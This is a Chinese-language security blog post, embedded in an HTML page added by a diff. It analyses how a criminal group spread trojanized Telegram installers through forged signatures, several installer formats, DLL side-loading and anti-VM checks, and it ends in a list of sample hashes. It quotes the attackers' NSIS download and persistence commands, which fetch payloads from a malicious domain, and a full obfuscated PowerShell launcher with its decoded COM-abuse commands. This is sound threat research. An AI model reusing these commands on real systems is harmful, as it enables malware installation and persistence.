@@ -1,0 +1,1134 @@
+
+<!DOCTYPE html>
+<html lang="en">
+    
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="generator" content="&lt;Theo/&gt;">
+    <title>追蹤看門狗集團：Telegram 捆綁木馬程式的多種型態分析 - &lt;Theo/&gt;</title>
+    <meta name="author" content="Theo Chen">
+    
+        <meta name="keywords" content="Telegram,Trojan,Malware,看門狗,金眼狗">
+    
+    
+        <link rel="icon" href="https://blog.theo.com.tw/assets/images/favicon.ico">
+    
+    
+        
+            <link rel="alternate" type="application/rss+xml" title="RSS" href="/rss2.xml">
+        
+    
+    <script type="application/ld+json">{"@context":"http://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Theo Chen","sameAs":["https://github.com/TheoKlein","https://twitter.com/The0_Klein","https://www.linkedin.com/in/theo-chen/","mailto:theokleintw@gmail.com"],"image":"https://www.gravatar.com/avatar/9b495e199d8dad2130ecb4407dca4176"},"articleBody":"繼前一篇 分析一個加料的 Telegram for Windows 中文版安裝程式 之後，陸續追蹤到 2021 現在，該集團仍然持續在活躍的行動中。對於偽造 Telegram 網站誘使使用者下載捆綁木馬程式的攻擊手法，在短時間內便發展出多種不同的型態，持續的改進其隱蔽手法和感染方式。\n\n\n背景陸續有其他安全廠商針對該集團的攻擊發表相關文章：\n\n2020&#x2F;11&#x2F;09 金眼狗组织水坑活动：针对Telegram用户的定向攻击\n2020&#x2F;12&#x2F;15 “看门狗”团伙远控木马投毒计\n2021&#x2F;01&#x2F;08 “伪装者”活动:针对Telegram特定用户的攻击\n\n可以得知其背後可能是屬於 金眼狗 集團（GoldenEyeDog），又稱 看門狗 集團，長期透過偽造通訊軟體網站或釣魚郵件攻擊特定族群。偽造 Telegram 中文版網站誘使使用者下載捆綁了木馬程式的 Telegram 便是前一篇文章所說的內容。\nFigure 1. 「看門狗」的名稱來自於樣本包含的 PDB 路徑\n\n在這段期間持續觀察的過程中，發現該集團在短時間內積極的嘗試了多種手段試圖規避檢測，包括：\n\n使用名稱相似的假簽章誤導使用者\n使用「簽章竊取」的手法盜用官方 Telegram 的簽章\n改變安裝程式的打包方式\n利用 Windows COM 界面繞過 UAC\n使用合法且具備正常簽章的程式搭配 DLL Side-Loading 的手段\n使用軟體保護工具（加殼）\n加入 anti-debugger &#x2F; anti-vm 的手法來規避分析\n\n真假簽章\n\n\nCertificateName\nSerialNumber\nValidFrom\nValidTo\n\n\n\nAdobe Inc.\n01\n2020-07-13T12:54:42+00:00\n2022-07-03T12:54:42+00:00\n\n\nDriver Information Technology Co., Ltd.\n81 3b 66 fe d5 8a ab 24 d0 2b 65 a9 30 1f 61 3a\n2020-09-04T00:00:00+00:00\n2021-05-22T23:59:59\n\n\nOORT inc.\n02 bf 32 f9 ab 47 2e d1 cf 33 a2 7c 06 f9 b3 b9\n2020-09-25T00:00:00+00:00\n2021-09-22T23:59:59+00:00\n\n\nOORT inc.\n53 78 c5 bb eb a0 d3 30 9a 35 bb 47 f6 30 37 f7\n2020-09-29T00:00:00+00:00\n2021-09-22T23:59:59+00:00\n\n\nOORT inc.\n98 be 45 2e da f1 46 4a 38 06 79 06 81 0b 4e b4\n2020-09-30T00:00:00+00:00\n2021-09-22T23:59:59+00:00\n\n\nOORT inc.\nec f1 57 7f dc f2 f9 f0 30 f9 d7 12 09 99 00 ab\n2020-10-15T00:00:00+00:00\n2021-10-12T23:59:59+00:00\n\n\nLOGMEIN, INC.\n1c 0d 4a 65 8b eb 7c b2 e6 f9 16 d9 b0 ef f7 20\n2020-11-05T00:00:00+00:00\n2021-11-03T23:59:59+00:00\n\n\nLOGMEIN, INC.\nd6 bb fa 3c 06 db 6f 44 7e 59 56 3d 34 9d dc b1\n2020-11-12T00:00:00+00:00\n2021-11-03T23:59:59+00:00\n\n\nGoogle LLC\n01\n2020-11-12T13:11:49+00:00\n2021-11-12T13:11:49+00:00\n\n\nLogMeIn, Inc.\neb 6c e3 39 df c4 6c 48 ab 44 67 1b d6 38 4e 9f\n2020-11-16T00:00:00+00:00\n2021-11-16T23:59:59+00:00\n\n\nLogMeIn, Inc.\n84 f4 2d 39 2e ab 89 6c fd c9 46 62 40 54 e0 8e\n2020-11-27T00:00:00+00:00\n2021-11-16T23:59:59+00:00\n\n\nCockos Incorporated\n01\n2020-12-17T04:09:15+00:00\n2021-12-17T04:09:15+00:00\n\n\nBeijing Baidu Netcom Science and Technology Co.,Ltd\n01\n2020-12-18T10:36:33+00:00\n2021-12-18T10:36:33+00:00\n\n\nBeijing Kingsoft Security software Co.,Ltd\n01\n2020-12-18T10:51:25+00:00\n2021-12-18T10:51:25+00:00\n\n\nSHENZHEN THUNDER NETWORKING TECHNOLOGIES LTD.\n01\n2020-12-18T13:30:06+00:00\n2021-12-18T13:30:06+00:00\n\n\n上面表格是根據 ValidFrom 做排序，從我收集到的樣本中整理出來的。整體來看，看門狗集團除了冒用一些軟體開發商的名稱來建立簽章以外，也會使用改變大小寫的方式來混淆使用者的辨別。\n除此之外值得一提的是，該攻擊者也使用過「簽章竊取」的手法來盜用官方 Telegram 的簽章。\nFigure 2. 簽章竊取的結果\n\n關於簽章竊取的手法可以參考：\n\nhttps://github.com/secretsquirrel/SigThief\nAuthenticode签名伪造——PE文件的签名伪造与签名验证劫持\nhttps://github.com/aaaddress1/SignThief\n\n使用簽章竊取手法盜用官方簽章的樣本：\n\n\n\nSHA256\nCompile Time\n\n\n\nec99947be1de325fe151edbf46535cc508ab65dd22778213c3cafcfeb9cb8c91\n2020-12-30T14:24:00\n\n\nb15dd01ddcebd7c81d437151990e591ddce18dcb5f611654c3cd56404620b9f9\n2020-12-02T07:12:01\n\n\n08b6dfa7ae14d00adbc97d91da9a3c7a110f473daf0cd08b58a768dd9b9e0fa3\n2020-11-24T15:35:53\n\n\n1c66307a3d89d758fba6979fd5e36bb904bc94c2f66d1587d0a89f2a8a87bb81\n2020-11-22T09:46:10\n\n\n安裝程式的改變在近三個月的時間裡，光是偽造的安裝程式本身就有許多不同的型態，攻擊者積極的嘗試使用不同的安裝系統來包裝木馬程式。\nAdvanced Installer這個型態是我在做關聯分析的時候往回找到的，使用 Advanced Installer 來打包安裝程式。從 Virustotal 的樣本上傳時間來看是在 2020 年 10 月初，大致和接下來 NSIS 打包的樣本差不多時間出現。可以透過 UniExtract2 將包裝內容解開，例如：\n123456789101112. ├── CommonAppDataFolder               // 對應到 C:\\ProgramData│ ├── fff.reg                         // 透過 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 實現持久化│ ├── Server.lnk                      // regedit.exe /s C:\\ProgramData\\fff.reg│ └── test.url                        // file:///C:/PerfLog/AddInProcess.exe├── Telegram.exe                      // 正常的 Telegram├── TgCn.msi                          // Advanced Installer 的安裝啟動器├── Updater.exe                       // 正常的 Telegram Update└── WindowsVolume                     // 對應到 C:\\    └── PerfLog         ├── AddInProcess.exe          // reflective Backdoor loader        └── AddInProcess.exe.config\n\n\nAdvanced Installer 特別的資料夾名稱對應實際位置可參考官方文件：https://www.advancedinstaller.com/user-guide/folder-paths.html\n\n在安裝的過程中，除了將上述資料夾內的檔案放置到對應的位置以外，透過 Advanced Installer Registry 的設定將 payload 寫入到 HKEY_CURRENT_USER\\Software\\&lt;COMPUTERNAME&gt;，後續由 AddInProcess.exe 透過 .NET Assembly.Load 的方式載入。\n除此之外，也有部份樣本具備檢測虛擬機的能力，查閱 Advanced Installer 的官方文件後發現確實是有這個 功能 可以啟用的，開發者可以在 Launch Conditions 裡勾選 Prevent running in virtual machines。\nFigure 3. Advanced Installer 檢測到虛擬機環境拒絕安裝\n\nNSISNSIS (nullsoft scriptable install system) 打包的安裝程式可以使用 7-zip 直接解壓縮就能得到還原的安裝腳本 [NSIS].nsi 以及打包的檔案。7-zip 在 9.33 的版本加入了自動反編譯 NSIS 腳本的功能，但又在 15.06 把這個功能拿掉了，所以要注意 7-zip 版本必須介於這兩者之間。\nNSIS Type 1使用 NSIS 打包的第一種版本，基本上和使用 Advanced Installer 打包的型態內容大同小異。\n接下來的 NSIS Type2 和 Type3 便是前一篇文章 分析一個加料的 Telegram for Windows 中文版安裝程式 所敘述的內容，但是額外發現了一些細節。\nNSIS Type 2Type 2 和 Type 1 相比最大的不同在於，寫入機碼 HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run 實現持久化的動作不再經由釋放 *.reg 檔案之後再做匯入，而是使用 NSIS 腳本實現：\n1WriteRegStr HKCU Software\\Microsoft\\Windows\\CurrentVersion\\Run telegramCnService C:\\PerfLog\\AddInProcess.exe\n但反而寫入 HKEY_CURRENT_USER\\Software\\&lt;COMPUTERNAME&gt; 的 payload 獨立成檔案 ns.reg 落地後再使用 NSIS 腳本呼叫 regedit.exe 匯入。\nNSIS 腳本片段：\n12345# Replace 123456 to &lt;ComputerName&gt; from ns.reg then use regedit.exe to importReadRegStr $R1 HKLM SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName ComputerNameTextReplace::_FindInFile /NOUNLOAD $INSTDIR\\ns.reg 123456 /S=1TextReplace::_ReplaceInFile /NOUNLOAD $INSTDIR\\ns.reg $INSTDIR\\ns.reg 123456 $R1 &quot;/S=1 /C=1 /AO=1&quot;Exec &quot;regedit.exe /s $\\&quot;$INSTDIR\\ns.reg$\\&quot;&quot;\n\nNSIS Type 3從 Type 3 開始，攻擊者不再把相關的惡意程式打包進安裝程式裡，相反的，所有的惡意程式在安裝過程中才會透過 NSIS 腳本額外下載下來。\nNSIS Type 3-1其中又可以細分 Type 3-1，這個版本和 Type 2 相同，但相關的檔案在安裝過程才會額外下載下來。\nNSIS 腳本片段：\n123# Download loader and registry fileInetLoad::load /BANNER &quot;&quot; &quot;Cameron Diaz download in progress, please wait ;)&quot; http://www.telegram-vip.com/index2.php cnPath.exeInetLoad::load /BANNER &quot;&quot; &quot;Cameron Diaz download in progress, please wait ;)&quot; http://www.telegram-vip.com/index3.php ns.reg\n\n這邊下載的 cnPath.exe 其實就是前面的 AddInProcess.exe，在 NSIS 腳本中也可以看到下載後將它重新命名放到指定的位置。\nNSIS 腳本片段：\n1234# Move $INSTDIR\\cnPath.exe to C:\\PerfLog\\AddInProcess.exeStrCpy $R0 $INSTDIR\\cnPath.exeStrCpy $R1 C:\\PerfLog\\AddInProcess.exeSystem::Call &quot;Kernel32::MoveFileA(t R0,t R1)&quot;\n\nNSIS Type 3-2Type 3-2 開始有了重大的改變，在安裝過程中一樣透過 NSIS 腳本下載一個解壓縮程式 winzip.exe 和一個壓縮檔，使用 winzip.exe 來解壓縮。\n另外，在這個版本也開始發現到使用合法程式搭配 DLL Side-Loading 來執行惡意程式的手法。例如 066864a2eab99d8821025b976ea26280c86e7db584b02df1d6230b3e40786fde 這個樣本會釋放以下的檔案：\n12345678// SHA256 066864a2eab99d8821025b976ea26280c86e7db584b02df1d6230b3e40786fde.├── cfwd2.dat           // used to verify├── cfwd3.dat           // used to verify├── gamecap.exe         // legitimate executable loader from 騰訊視頻 (QQLivePlayer.exe)├── module_cfg.bin      // payload├── QLMainModule.dll    // DLL Side-loading, with fake &quot;Google LLC&quot; certificate└── VMProtectSDK32.dll  // legitimate DLL\n主程式 gamecap.exe 是一個來自騰訊的合法程式，會呼叫來自 QLMainModule.dll 的匯出函式 QQLiveWinMain 開始感染流程。第一次執行時首先檢查 mutex gamecap 是否存在，接著驗證 cfwd2.dat 的檔案內容，沒有問題的話便建立一個自己新的程序。接下來第二次執行時確認 mutex 已經存在，接著檢查 cfwd3.dat 和 module_cfg.bin 的檔案內容，沒有問題後才會透過 HTTP 請求下載後續要注入的 payload，在記憶體中載入執行。\n這裡 DLL Side-Loading 的程式來自騰訊只是其中一個例子，也可以是其他任意具有 DLL Side-Loading 弱點的程式。\n同時，這裡第一次看到 VMProtectSDK32.dll，攻擊者開始嘗試使用 VMProtect，這在後面會另外提到。\nWindows MFC在 2020&#x2F;11&#x2F;24，我追蹤到使用 Windows MFC 框架重新撰寫的安裝程式。從這開始，感染流程又有了新的變化，並且開始加入了一些不一樣的規避手法。\nMFC Type 1從這個型態開始，攻擊者再次將大部分惡意程式包含在安裝程式中，在安裝期間釋放到指到位置，並且在樣本中嵌入 base64 字串來執行混淆的 powershell script。\n其中一種還原前的內容：\n1c:\\windows\\system32\\cmd.exe /c &quot; echo\\ -join ( ( 53,74 ,61 , 72, 74 , 20 , 43 ,&#x27;3a&#x27; , &#x27;5c&#x27; , 50,72 ,&#x27;6f&#x27;,67 ,72, 61, &#x27;6d&#x27;, 44,61 , 74 ,61,&#x27;5c&#x27; ,52 , 65,63 ,&#x27;6f&#x27; ,76,65,72,79,&#x27;5c&#x27;,73, 65, 74 ,75 ,70 , &#x27;2e&#x27; , 65, 78, 65 ,&#x27;3b&#x27; ,&#x27;5b&#x27;,53, 79 ,73 , 74 ,65 ,&#x27;6d&#x27;,&#x27;2e&#x27;, 41 , 63,74 , 69 , 76, 61 , 74 ,&#x27;6f&#x27; ,72,&#x27;5d&#x27;,&#x27;3a&#x27;, &#x27;3a&#x27;,43 , 72 ,65, 61 ,74,65 ,49 , &#x27;6e&#x27; , 73 ,74 , 61, &#x27;6e&#x27;, 63, 65, 28, &#x27;5b&#x27;,54,79 ,70 , 65, &#x27;5d&#x27; ,&#x27;3a&#x27;, &#x27;3a&#x27; ,47,65 ,74 , 54,79, 70,65,46,72 , &#x27;6f&#x27; ,&#x27;6d&#x27;, 43, &#x27;4c&#x27;, 53,49 , 44, 28 ,27, 39 , 42 , 41, 30 , 35,39 ,37 ,32 , &#x27;2d&#x27;, 46, 36,41, 38 , &#x27;2d&#x27; , 31,31 ,43 , 46,&#x27;2d&#x27; , 41 , 34 , 34, 32 ,&#x27;2d&#x27;,30 ,30 , 41 ,30,43 ,39,30 , 41, 38,46, 33 ,39 ,27,29 , 29 , &#x27;2e&#x27;,69 ,74, 65 , &#x27;6d&#x27; ,28, 29 , &#x27;2e&#x27; ,44 ,&#x27;6f&#x27; , 63 , 75 , &#x27;6d&#x27;, 65 , &#x27;6e&#x27;, 74, &#x27;2e&#x27; ,41 ,70,70, &#x27;6c&#x27; ,69 ,63, 61 ,74 , 69 ,&#x27;6f&#x27;, &#x27;6e&#x27;,&#x27;2e&#x27; ,53, 68 , 65 ,&#x27;6c&#x27; , &#x27;6c&#x27; , 45, 78, 65,63,75, 74,65 , 28,22, 61 ,74 ,74 , 72,69 , 62, &#x27;2e&#x27;, 65,78 ,65, 22,&#x27;2c&#x27; ,22,43 , &#x27;3a&#x27;,&#x27;5c&#x27;, 50,72,&#x27;6f&#x27;, 67,72 ,61 ,&#x27;6d&#x27;, 44, 61, 74, 61 , &#x27;5c&#x27; ,52 , 65 , 63 , &#x27;6f&#x27; ,76, 65 , 72 , 79,20,&#x27;2b&#x27;, 73, 20 , &#x27;2b&#x27; , 68 ,22,&#x27;2c&#x27;,22, 63 , &#x27;3a&#x27;,&#x27;2f&#x27; ,77,69, &#x27;6e&#x27; ,64, &#x27;6f&#x27; ,77,73,&#x27;2f&#x27;,73, 79 ,73 ,74,65, &#x27;6d&#x27;,33 ,32 ,22 ,&#x27;2c&#x27;,24 ,&#x27;6e&#x27;, 75 , &#x27;6c&#x27;, &#x27;6c&#x27;, &#x27;2c&#x27; ,30 , 29 ,&#x27;3b&#x27;, &#x27;5b&#x27;,53,79,73 , 74 , 65,&#x27;6d&#x27; , &#x27;2e&#x27;, 41, 63 , 74,69 , 76,61 ,74 , &#x27;6f&#x27;, 72, &#x27;5d&#x27; , &#x27;3a&#x27; , &#x27;3a&#x27; ,43, 72 , 65,61 ,74, 65,49, &#x27;6e&#x27; ,73 , 74, 61,&#x27;6e&#x27; , 63 ,65, 28, &#x27;5b&#x27;,54 , 79 ,70,65,&#x27;5d&#x27; , &#x27;3a&#x27;,&#x27;3a&#x27; , 47 ,65 ,74 ,54,79 ,70, 65 , 46,72, &#x27;6f&#x27; ,&#x27;6d&#x27; , 43 , &#x27;4c&#x27;,53, 49 ,44 ,28 , 27 ,39, 42 ,41, 30,35, 39 , 37, 32, &#x27;2d&#x27; ,46,36 ,41, 38, &#x27;2d&#x27; ,31 ,31 ,43 ,46 , &#x27;2d&#x27;, 41, 34,34 ,32 , &#x27;2d&#x27; , 30, 30 ,41 ,30 ,43 , 39,30,41 , 38, 46 ,33, 39 ,27,29, 29 ,&#x27;2e&#x27; ,69 ,74 , 65 ,&#x27;6d&#x27; ,28 ,29 ,&#x27;2e&#x27; , 44 ,&#x27;6f&#x27;,63,75,&#x27;6d&#x27;, 65,&#x27;6e&#x27;,74 , &#x27;2e&#x27; , 41, 70 , 70, &#x27;6c&#x27; , 69, 63 , 61 ,74 , 69 ,&#x27;6f&#x27;,&#x27;6e&#x27; ,&#x27;2e&#x27; ,53 ,68 , 65,&#x27;6c&#x27; , &#x27;6c&#x27; , 45,78,65,63 , 75 ,74 ,65 , 28,22 , 69 ,70, 63 ,&#x27;6f&#x27;,&#x27;6e&#x27; ,66, 69,67,&#x27;2e&#x27; ,65 , 78,65 ,22, &#x27;2c&#x27; ,22 ,&#x27;2f&#x27; ,72,65,&#x27;6c&#x27;, 65 , 61,73 ,65, 22, &#x27;2c&#x27; ,22 , 63,&#x27;3a&#x27;, &#x27;2f&#x27;, 77, 69, &#x27;6e&#x27;,64 , &#x27;6f&#x27; , 77 , 73 , &#x27;2f&#x27; , 73 , 79, 73 ,74,65, &#x27;6d&#x27; , 33 ,32,22 , &#x27;2c&#x27; , 24,&#x27;6e&#x27;,75,&#x27;6c&#x27;, &#x27;6c&#x27;,&#x27;2c&#x27;, 30,29 ,&#x27;3b&#x27; , 53 , 74, 61 , 72, 74 ,&#x27;2d&#x27; ,53 , &#x27;6c&#x27; , 65 ,65, 70 , 20 , &#x27;2d&#x27;, 53 ,65,63, &#x27;6f&#x27;,&#x27;6e&#x27; ,64 , 73,20 ,32, &#x27;3b&#x27; , &#x27;5b&#x27;,53 , 79, 73, 74,65,&#x27;6d&#x27;,&#x27;2e&#x27; ,41,63 ,74, 69 ,76 ,61, 74, &#x27;6f&#x27;, 72 , &#x27;5d&#x27; , &#x27;3a&#x27; ,&#x27;3a&#x27;, 43 , 72 , 65 , 61 , 74 , 65 ,49 ,&#x27;6e&#x27;,73 , 74 , 61,&#x27;6e&#x27; , 63 ,65,28 , &#x27;5b&#x27;,74 , 79, 70 ,65 , &#x27;5d&#x27; , &#x27;3a&#x27; , &#x27;3a&#x27;, 47 ,65 , 74,54 , 79 ,70 , 65 ,46 , 72 , &#x27;6f&#x27;,&#x27;6d&#x27;,50,72 , &#x27;6f&#x27;, 67 ,49 ,44,28 ,22 , &#x27;4d&#x27; , &#x27;4d&#x27;,43 , 32 , 30,&#x27;2e&#x27;,41 ,70 ,70 , &#x27;6c&#x27;, 69, 63,61 , 74, 69 , &#x27;6f&#x27; ,&#x27;6e&#x27; ,22 , 29 ,29 , &#x27;2e&#x27;,44, &#x27;6f&#x27; , 63 , 75 , &#x27;6d&#x27;, 65, &#x27;6e&#x27;,74,&#x27;2e&#x27;, 41,63 , 74, 69 , 76,65,56 , 69, 65 ,77, &#x27;2e&#x27;, 45 ,78 , 65,63, 75 ,74,65 ,53 , 68 ,65 ,&#x27;6c&#x27;,&#x27;6c&#x27;,43 , &#x27;6f&#x27; , &#x27;6d&#x27;,&#x27;6d&#x27;, 61,&#x27;6e&#x27; ,64, 28 , 22 ,43 , &#x27;3a&#x27;,&#x27;5c&#x27;, 50 ,72,&#x27;6f&#x27;, 67, 72 , 61 , &#x27;6d&#x27; , 44 , 61 ,74,61 , &#x27;5c&#x27;,52 ,65 , 63,&#x27;6f&#x27;, 76,65,72,79 ,&#x27;5c&#x27; , 53, 65, 72, 76 , 65, 72 , &#x27;2e&#x27;,76 ,62 ,65, 22,&#x27;2c&#x27; ,22 ,30,22, &#x27;2c&#x27;, 22, 30, 22, &#x27;2c&#x27;, 22, &#x27;4d&#x27;, 69 ,&#x27;6e&#x27;, 69 ,&#x27;6d&#x27;,69, &#x27;7a&#x27;,65 ,64, 22 , 29 , &#x27;3b&#x27;, 53,74 ,61, 72 , 74 , 20, 43, &#x27;3a&#x27; ,&#x27;5c&#x27; ,50, 72 ,&#x27;6f&#x27; , 67 , 72 ,61, &#x27;6d&#x27; ,44 , 61, 74, 61,&#x27;5c&#x27;,52, 65 , 63,&#x27;6f&#x27;,76,65, 72, 79 , &#x27;5c&#x27;, 67, 61, &#x27;6d&#x27; ,65 ,63 , 61 ,70 , &#x27;2e&#x27;, 65, 78 ,65, &#x27;3b&#x27;, 53 , 74, 61 , 72, 74 ,&#x27;2d&#x27; ,53 , &#x27;6c&#x27;, 65 , 65 ,70 ,20,&#x27;2d&#x27; ,53, 65 ,63, &#x27;6f&#x27; , &#x27;6e&#x27;,64,73 , 20, 32, &#x27;3b&#x27; , &#x27;5b&#x27; ,53 ,79 , 73 , 74,65 ,&#x27;6d&#x27; , &#x27;2e&#x27;, 41 ,63, 74,69,76,61, 74 ,&#x27;6f&#x27;, 72 , &#x27;5d&#x27; , &#x27;3a&#x27;,&#x27;3a&#x27;, 43, 72,65 , 61,74, 65 , 49,&#x27;6e&#x27; ,73,74, 61,&#x27;6e&#x27; ,63,65,28,&#x27;5b&#x27; ,54,79 ,70 ,65 ,&#x27;5d&#x27;,&#x27;3a&#x27; , &#x27;3a&#x27; , 47,65 , 74 ,54 , 79, 70 , 65,46 , 72, &#x27;6f&#x27;, &#x27;6d&#x27;,43 , &#x27;4c&#x27;, 53,49, 44,28, 27,39,42,41 , 30, 35,39 ,37,32 ,&#x27;2d&#x27;, 46 , 36, 41 , 38 ,&#x27;2d&#x27;,31, 31 , 43, 46,&#x27;2d&#x27;,41 ,34 ,34 , 32 ,&#x27;2d&#x27; ,30 ,30, 41,30 , 43,39 , 30 ,41 ,38, 46 , 33, 39 , 27,29,29, &#x27;2e&#x27; ,69 , 74,65 ,&#x27;6d&#x27; ,28,29 ,&#x27;2e&#x27; , 44, &#x27;6f&#x27;,63, 75, &#x27;6d&#x27; , 65,&#x27;6e&#x27;, 74 , &#x27;2e&#x27;, 41 ,70,70 , &#x27;6c&#x27; ,69 ,63 ,61 ,74,69 ,&#x27;6f&#x27;, &#x27;6e&#x27; ,&#x27;2e&#x27; , 53 , 68 ,65 , &#x27;6c&#x27; ,&#x27;6c&#x27; , 45 ,78,65 ,63 , 75, 74, 65 ,28,22, 69 , 70 , 63, &#x27;6f&#x27;, &#x27;6e&#x27;, 66 ,69, 67,&#x27;2e&#x27;, 65 , 78,65 ,22 , &#x27;2c&#x27; , 22 ,&#x27;2f&#x27;,72 , 65 , &#x27;6e&#x27;, 65 , 77,22 , &#x27;2c&#x27; ,22,63 ,&#x27;3a&#x27;,&#x27;2f&#x27; ,77, 69 ,&#x27;6e&#x27;, 64 ,&#x27;6f&#x27; ,77,73 , &#x27;2f&#x27;, 73 ,79,73, 74 , 65,&#x27;6d&#x27;,33 , 32 ,22, &#x27;2c&#x27;,24 , &#x27;6e&#x27; ,75 ,&#x27;6c&#x27;, &#x27;6c&#x27; ,&#x27;2c&#x27; , 30, 29 ) ^^^|foreach &#123; ([convert]::toint16( ([string]$_ ) ,16) -as [char])&#125; ) ^^^| . ( $shellid[1]+$shellid[13]+&#x27;x&#x27;) | powershell -command $executioncontext.invokecommand.invokescript( $&#123;input&#125;)&quot;\n\n\n混淆的方式不只一種，這邊僅舉其中一種為例。\n\n還原後的內容：\n12345678Start C:\\ProgramData\\Recovery\\setup.exe;[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;)).item().Document.Application.ShellExecute(&quot;attrib.exe&quot;,&quot;C:\\ProgramData\\Recovery +s +h&quot;,&quot;c:/windows/system32&quot;,$null,0);[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;)).item().Document.Application.ShellExecute(&quot;ipconfig.exe&quot;,&quot;/release&quot;,&quot;c:/windows/system32&quot;,$null,0);Start-Sleep -Seconds 2;[System.Activator]::CreateInstance([type]::GetTypeFromProgID(&quot;MMC20.Application&quot;)).Document.ActiveView.ExecuteShellCommand(&quot;C:\\ProgramData\\Recovery\\Server.vbe&quot;,&quot;0&quot;,&quot;0&quot;,&quot;Minimized&quot;);Start C:\\ProgramData\\Recovery\\gamecap.exe;Start-Sleep -Seconds 2;[System.Activator]::CreateInstance([Type]::GetTypeFromCLSID(&#x27;9BA05972-F6A8-11CF-A442-00A0C90A8F39&#x27;)).item().Document.Application.ShellExecute(&quot;ipconfig.exe&quot;,&quot;/renew&quot;,&quot;c:/windows/system32&quot;,$null,0)\n\n這裡可以看到攻擊者首次使用 Windows COM 物件來提權執行命令，相關的攻擊手法可參考：Abusing COM &amp; DCOM objects。\n其他行為大致和前一型態相同，持久化的手法仍然是透過放置捷徑到 Startup Menu 的方式，魔改過的 gh0st RAT 本體會在後門執行時才會下載並載入到記憶體中執行。\nMFC Type 2Type 2 與 Type 1 最大的不同在於，捨棄了使用 base64 編碼的 powershell script，將所有內容內化到安裝程式的程式的邏輯中，並且使用 Stack String 搭配 XOR 等基本位元運算來隱藏相關的所有路徑 &#x2F; 檔案字串。除此之外，原先經由 powershell script 濫用 COM 物件的手法也獨立成一個新的執行檔 go.exe，負責提權並且開始載入惡意程式的相關流程。\nType 2 最大的亮點在於，攻擊者在使用 Advance Installer 打包的樣本中曾經出現過檢測虛擬機環境的行為後，這次的型態再一次的加入了檢測虛擬機環境的動作，靠的是 WMI script 來檢測 CPU 的溫度。這個反虛擬機的手法在 2018 年的時候就有一個名為 GravityRAT 的惡意程式使用過，對該程式的分析可以參考 Malware VM detection techniques evolving: an analysis of GravityRAT。基本上 Hyper-V, VMWare Fusion, VirtualBox, KVM 或 XEN 都沒有支援這個監控資料，但是這個手法並不是完美的，文中也提到一些近期的硬體設備也同樣不支援提供 CPU 的溫度資料，這會使這個手法將實體機器誤認為是虛擬機從而躲過一劫，安裝程式開始執行後一旦偵測到處於虛擬機環境或是 debugger 環境，便會直接結束。\nFigure 4. 在虛擬機中無法取得 CPU 溫度\n\n\nSoftware Packer在 2020&#x2F;12&#x2F;22 ~ 2020&#x2F;12&#x2F;24 這個期間內（compile time），曾經發現 5 個樣本使用了 VMProtect 或 Safengin Shielden 做了加殼處理，其保護的內容為上述的 MFC Type。攻擊者可能是實驗性的使用加殼手段來防護原始碼或阻礙分析，在 2020&#x2F;12&#x2F;26 新追蹤到的樣本又不再使用加殼保護以後，截至撰寫本文時尚未發現其他有加殼的樣本。\n結語在這篇文章發佈時（2021&#x2F;01&#x2F;20），其實已經又追蹤到幾個更新的樣本，但再累積下去會一次寫太多內容，就先以近三個月前幾種大的型態為主來分享整個改變的過程。\n在短短三個月內時間內，可以看到背後的攻擊者非常積極的在更新惡意程式，其感染手法雖然大同小異，但是規避的手法或是反調查的手段卻是越改越成熟。偽造通訊軟體網站只是看門狗集團的其中一個攻擊手段，其他還有釣魚郵件 &#x2F; 直接 Telegram 群組散播惡意程式等。近來 Telegram 的中文使用者人數增加，有鑑於官方並沒有提供中文版的界面，很多人便開始尋找中文化的解決方案，正好中了攻擊者的意，透過 Google 廣告和網站 SEO，使用者會很容易搜尋或是直接在廣告看到，遭到誘騙上當。\nFigure 5. 出現在 Google 廣告的內容\n\nFigure 6. 目前偽造網站的截圖\n\n\n\n這個攻擊行動仍然還在持續進行中，攻擊者也還在不斷更新他們的惡意程式，未來應該還有機會有下一篇文章 :)\n附件：IoCsAdvanced Installer\n\n0bf579a9c7c6a4b0dc58ab5372699b04601a783ea5f33fa62e4100b41be1e55f\n1f6e6d81d77ccb5bb0e7e2264f1fa021faad244ac68e942930e57133ee6da976\n56081f073519f7929c79bf8b88a4e4c257b31d67f8df9fa3f3d1793ee3da91d7\n\nNSIS Type 1\n\n971ca26b8e1e4e0cd9b009812f0084ade65174e9f4d1579fd05ae011225b1e7e\n\nNSIS Type 2\n\n1d6677b629e65e6a9341686c5d219f07383b496c8796bcf8630f5dde96dbbad3\n1f09381186a82f070d7beda66f575efdecd92b76217b5a0d9b904c1d64c89fc8\n214a3a1ac1f42a49bf837e2d1d76ff53e6db759032206156e01f78d9db1011f5\n2a127b774d59ba560bc6131b84a71b8e3535be41c1c4b10fc8084724b2dded92\nc6f5aa44b385578e2876a2aa6d1e9186cae54dc359164a03a8bcd2bb59dbce8f\nf6c622b152b6d4fa362d2900eba8934dcae3f3d958b792524cf48bcbc7d08140\n\nNSIS Type 3-1\n\n35133a3283381aa503f0d415de3ab8111e2e690bd32ad3dddde1213b51c877ba\n57dd6a698440752a4b5a26e497531ebfdd6bc565c265652b60f29a505481286a\n\nNSIS Type 3-2\n\n273c9116367bd5d6c6e5b40b0ad287776b34db67d5656cf985c5761d3ea1714c\n340aa68450e42c11c8835739024b5d221a7793b1450e014f33cc99fe1d08fc51\ndc5d1fb0f60c1d2c2b7500e6a3f2c3e0b3e1465f5faf2d6b107baf4832751837\neede9bebbb5e411b98ed3ab22287ca405e978ce64edd2c5b488bcb61e979965d\n\nMFC Type 1\n\n08b6dfa7ae14d00adbc97d91da9a3c7a110f473daf0cd08b58a768dd9b9e0fa3\n1c66307a3d89d758fba6979fd5e36bb904bc94c2f66d1587d0a89f2a8a87bb81\n399626c3147001fd79cbbf3e3e49da69e662a67a4310196419f6eb3892b05cc4\n3dd27291ecc80ded11eded0b4f8deb3a727a83538f50edb7a5b09b002241f5ea\n9e14301f185291b9a50bf32a511ee6561aac3248058d1f414dfd6e42a07326d9\nb15dd01ddcebd7c81d437151990e591ddce18dcb5f611654c3cd56404620b9f9\n\nMFC Type 